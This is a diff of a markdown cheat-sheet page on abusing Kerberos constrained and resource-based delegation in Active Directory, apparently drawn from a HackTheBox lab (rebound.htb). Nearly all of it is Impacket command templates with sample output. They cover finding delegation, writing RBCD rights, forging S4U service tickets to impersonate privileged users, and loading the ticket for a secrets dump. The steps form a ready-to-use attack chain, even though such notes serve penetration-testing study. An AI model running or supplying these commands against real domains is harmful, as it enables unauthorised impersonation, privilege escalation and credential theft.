@@ -1,19 +1,22 @@
 ---
 title: "Constrained Delegation"
-date: 2024-8-2
-tags: ["Credential Dumping", "Impacket", "Pass-The-Ticket", "Silver Ticket", "Ticket Granting Ticket", "Constrained Delegation", "Active Directory", "Windows", "RBCD"]
+date: 2025-7-18
+tags: ["Credential Dumping", "Impacket", "Pass-The-Ticket", "Silver Ticket", "Ticket Granting Ticket", "Constrained Delegation", "Active Directory", "Windows", "RBCD", "KCD"]
 ---
-
-### Abuse #1: RBCD Attack
 
 {{< tab set1 tab1 >}}Linux{{< /tab >}}
 {{< tabcontent set1 tab1 >}}
 
-#### 1. Find delegation
+#### 1. Find Delegation
 
 ```console
-# Check delegation
-sudo ntpdate -s <DC_IP> && impacket-findDelegation '<DOMAIN>/<USER>' -dc-ip <DC> -hashes :<HASH> -k -no-pass
+# Password
+sudo ntpdate -s <DC_IP> && impacket-findDelegation '<DOMAIN>/<USER>:<PASSWORD>' -k -no-pass -dc-ip <DC>
+```
+
+```console
+# NTLM
+sudo ntpdate -s <DC_IP> && impacket-findDelegation '<DOMAIN>/<USER>' -hashes :<HASH> -k -no-pass -dc-ip <DC>
 ```
 
 ```console {class="sample-code"}
@@ -29,10 +32,15 @@ AccountName  AccountType                          DelegationType  DelegationRigh
 delegator$   ms-DS-Group-Managed-Service-Account  Constrained     http/dc01.rebound.htb  No
 ```
 
-#### 3. RBCD Attack
+#### 2. RBCD
 
 ```console
-# Add delegation
+# Password
+sudo ntpdate -s <DC_IP> && impacket-rbcd '<DOMAIN>/<USER>:<PASSWORD>' -k -delegate-from '<TARGET_1>' -delegate-to '<USER>' -action write -dc-ip <DC> -use-ldaps
+```
+
+```console
+# NTLM
 sudo ntpdate -s <DC_IP> && impacket-rbcd '<DOMAIN>/<USER>' -hashes :<HASH> -k -delegate-from '<TARGET_1>' -delegate-to '<USER>' -action write -dc-ip <DC> -use-ldaps
 ```
 
@@ -48,9 +56,16 @@ Impacket v0.13.0.dev0+20240916.171021.65b774de - Copyright Fortra, LLC and its a
 [*]     ldap_monitor   (S-1-5-21-4078382237-1492182817-2568127209-7681)
 ```
 
+#### 3. Check
+
 ```console
-# Check
-sudo ntpdate -s <DC_IP> && impacket-findDelegation '<DOMAIN>/<USER>' -dc-ip <DC> -hashes :<HASH> -k -no-pass
+# Password
+sudo ntpdate -s <DC_IP> && impacket-findDelegation '<DOMAIN>/<USER>:<PASSWORD>' -k -no-pass -dc-ip <DC>
+```
+
+```console
+# NTLM
+sudo ntpdate -s <DC_IP> && impacket-findDelegation '<DOMAIN>/<USER>' -hashes :<HASH> -k -no-pass -dc-ip <DC>
 ```
 
 ```console {class="sample-code"}
@@ -66,10 +81,10 @@ ldap_monitor  Person                               Resource-Based Constrained  d
 delegator$    ms-DS-Group-Managed-Service-Account  Constrained                 http/dc01.rebound.htb
 ```
 
-#### 4. Get a service ticket
+#### 4. Get a Service Ticket of Target User
 
 ```console
-# Impersonate
+# Password
 impacket-getST '<DOMAIN>/<TARGET_1>:<TARGET_1_PASSWORD>' -spn <SERVICE_1>/<TARGET_DOMAIN> -impersonate '<TARGET_2>'
 ```
 
@@ -84,6 +99,8 @@ Impacket v0.13.0.dev0+20240916.171021.65b774de - Copyright Fortra, LLC and its a
 [*] Requesting S4U2Proxy
 [*] Saving ticket in DC01$@browser_dc01.rebound.htb@REBOUND.HTB.ccache
 ```
+
+#### 5. Check
 
 ```console
 # Check forwardable flag
@@ -115,9 +132,10 @@ Impacket v0.13.0.dev0+20240916.171021.65b774de - Copyright Fortra, LLC and its a
 [-] Could not find the correct encryption key! Ticket is encrypted with aes256_cts_hmac_sha1_96 (etype 18), but no keys/creds were supplied
 ```
 
-#### 5. Impersonate
+#### 6. Impersonate
 
 ```console
+# NTLM
 impacket-getST -spn <SERVICE_2>/<TARGET_DOMAIN> -impersonate <TARGET_2> '<DOMAIN>/<USER>' -hashes :<HASH> -additional-ticket <TICKET_1>.ccache
 ```
 
@@ -133,7 +151,7 @@ Impacket v0.13.0.dev0+20240916.171021.65b774de - Copyright Fortra, LLC and its a
 [*] Saving ticket in DC01$@http_dc01.rebound.htb@REBOUND.HTB.ccache
 ```
 
-#### 4. Secrets Dump
+#### 7. Secrets Dump
 
 ```console
 export KRB5CCNAME='<TICKET_2>.ccache'
